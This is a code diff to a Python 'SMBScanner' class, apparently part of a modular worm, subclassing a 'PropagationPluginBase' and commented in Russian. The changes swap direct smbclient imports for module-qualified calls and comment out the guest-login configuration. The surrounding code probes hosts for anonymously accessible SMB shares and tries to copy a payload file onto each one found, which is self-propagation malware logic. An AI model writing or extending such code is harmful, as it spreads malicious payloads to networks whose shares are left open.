@@ -9,7 +9,8 @@ import socket
 import ipaddress
 import subprocess
 import threading
-from smbclient import listdir, stat, ClientConfig, register_session, makedirs, remove, rmdir, symlink # Используем smbclient (форк pysmb)
+import smbclient
+# from smbclient import ClientConfig # <<< Закомментировано
 
 from ..interfaces import PropagationPluginBase
 from typing import TYPE_CHECKING, List, Optional
@@ -34,7 +35,7 @@ class SMBScanner(PropagationPluginBase):
         self.check_interval = self.config.get("check_interval", 600) # Секунды
 
         # Настраиваем smbclient для анонимного доступа
-        ClientConfig(username="guest", password="")
+        # ClientConfig(username="guest", password="") # <<< Закомментировано
 
     def get_name(self) -> str:
         return "smb_scanner"
@@ -98,10 +99,12 @@ class SMBScanner(PropagationPluginBase):
         try:
             # Регистрация сессии (для анонимного доступа уже настроено через ClientConfig)
             # register_session(ip, username="guest", password="") # Не обязательно, если настроено глобально
+            # smbclient.register_session(ip, username="guest", password="")
             logger.debug(f"Attempting anonymous connection to {target_server}")
 
             # Пытаемся получить список шар (может не работать анонимно)
             # shares = listdir(target_server)
+            # shares = smbclient.listdir(target_server)
             # logger.debug(f"Shares found on {ip}: {shares}")
             # Пробуем подключиться к известным именам шар
             for share_name in self.share_names:
@@ -109,7 +112,7 @@ class SMBScanner(PropagationPluginBase):
                 payload_dest_path = f"{target_share_path}\\{self.payload_name}"
                 try:
                     # Проверяем доступность шары, пытаясь получить ее статус
-                    stat(target_share_path)
+                    smbclient.stat(target_share_path)
                     logger.info(f"Found accessible share: {target_share_path}")
 
                     # Пытаемся скопировать файл
